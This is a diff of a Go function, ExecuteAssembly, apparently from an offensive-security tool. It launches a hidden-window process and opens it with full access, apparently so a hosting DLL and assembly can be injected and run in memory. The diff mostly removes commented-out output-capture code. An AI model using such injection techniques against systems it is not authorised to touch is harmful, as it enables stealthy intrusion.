@@ -5,7 +5,6 @@ package assembly
 import (
 	"bytes"
 	"fmt"
-	//"io"
 	"log"
 	"os"
 	"os/exec"
@@ -88,28 +87,12 @@ func ExecuteAssembly(cmdBuffer *bytes.Buffer, hostingDll, assembly []byte, param
 	cmd.SysProcAttr = &syscall.SysProcAttr{
 		HideWindow: true,
 	}
-	//var stdoutBuf, stderrBuf bytes.Buffer
-	//stdoutIn, err := cmd.StdoutPipe()
-	//stdIn,err:=cmd.StdinPipe()
-
-	//if(err != nil){
-	//	log.Printf("ERROR WITH stdoutIn: ",err)
-	//}
-	//stderrIn, err := cmd.StderrPipe()
-	//if(err != nil){
-	//	log.Printf("ERROR WITH stderrIn: ",err)
-	//}
 
 	// this my fix
-	//cmd.Stdout = stdIn
-	//cmd.Stdout = os.Stdout
+	// TODO: make sure cmd.Stderr can also use cmdBuffer
 	cmd.Stdout = cmdBuffer
 	cmd.Stderr = os.Stderr
-	//cmd.Stdin = *(cmdIn)
-
-	//var errStdout, errStderr error
 	cmd.Start()
-	//defer return stdoutIn,nil
 
 	pid := cmd.Process.Pid
 	// OpenProcess with PROC_ACCESS_ALL
@@ -154,22 +137,5 @@ func ExecuteAssembly(cmdBuffer *bytes.Buffer, hostingDll, assembly []byte, param
 		return err
 	}
 
-	//thing, errStdout := io.Copy(&stdoutBuf, stdoutIn)
-	//fmt.Println("thing: ",thing)
-	//
-	//out := string(stdoutBuf.Bytes())
-	//log.Printf(out)
-
-	//go func() {
-	//	_, errStdout = io.Copy(&stdoutBuf, stdoutIn)
-	//}()
-	//_, errStderr = io.Copy(&stderrBuf, stderrIn)
-
-	//if errStdout != nil || errStderr != nil {
-	//	log.Fatal("failed to capture stdout or stderr\n")
-	//}
-	//outStr, errStr := string(stdoutBuf.Bytes()), string(stderrBuf.Bytes())
-	//fmt.Printf("\nout:\n%s\nerr:\n%s\n", outStr, errStr)
-	//log.Printf(outStr,errStr)
 	return nil
 }
